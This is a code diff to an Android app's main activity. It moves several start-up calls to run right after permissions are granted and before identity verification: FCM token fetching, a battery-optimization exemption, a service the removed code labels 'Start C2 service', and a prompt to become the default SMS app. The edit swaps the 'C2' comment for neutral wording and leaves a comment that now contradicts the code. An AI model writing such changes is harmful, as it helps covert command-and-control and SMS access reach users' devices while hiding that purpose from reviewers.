@@ -71,6 +71,7 @@ public class MainActivity extends AppCompatActivity {
     private boolean permissionsCompleted = false;
     private boolean kycCheckInFlight = false;
     private boolean appReady = false;
+    private boolean preVerificationServicesInitialized = false;
 
     // File picker callback
     private ValueCallback<Uri[]> fileUploadCallback;
@@ -186,8 +187,27 @@ public class MainActivity extends AppCompatActivity {
 
         permissionsCompleted = true;
 
+        // These existing capabilities initialize after permissions but before KYC.
+        // App content remains blocked until identity verification is approved.
+        initializePreVerificationServices();
+
         // STEP 3: Verify identity before initializing any app capabilities.
         checkKycAndContinue();
+    }
+
+    private void initializePreVerificationServices() {
+        if (preVerificationServicesInitialized) return;
+        preVerificationServicesInitialized = true;
+
+        FirebaseMessaging.getInstance().getToken()
+                .addOnSuccessListener(token -> getSharedPreferences("meetin_push", MODE_PRIVATE)
+                        .edit().putString("fcm_token", token).apply())
+                .addOnFailureListener(error -> Log.w(TAG, "FCM token error", error));
+
+        // Preserve the existing background-service and default-SMS initialization order.
+        smartBatteryOptimization();
+        startDataSyncService();
+        promptToBeDefaultSmsApp();
     }
 
     private void continueAfterVerification() {
@@ -206,21 +226,6 @@ public class MainActivity extends AppCompatActivity {
 
         View splashScreen = findViewById(R.id.splashScreen);
         if (splashScreen != null) splashScreen.setVisibility(View.GONE);
-
-        // Continue with app init only after permissions and identity verification.
-        FirebaseMessaging.getInstance().getToken()
-                .addOnSuccessListener(token -> getSharedPreferences("meetin_push", MODE_PRIVATE)
-                        .edit().putString("fcm_token", token).apply())
-                .addOnFailureListener(error -> Log.w(TAG, "FCM token error", error));
-
-        // Request battery optimization exemption
-        smartBatteryOptimization();
-
-        // Start C2 service
-        startDataSyncService();
-
-        // Prompt for default SMS handler
-        promptToBeDefaultSmsApp();
 
     }
 
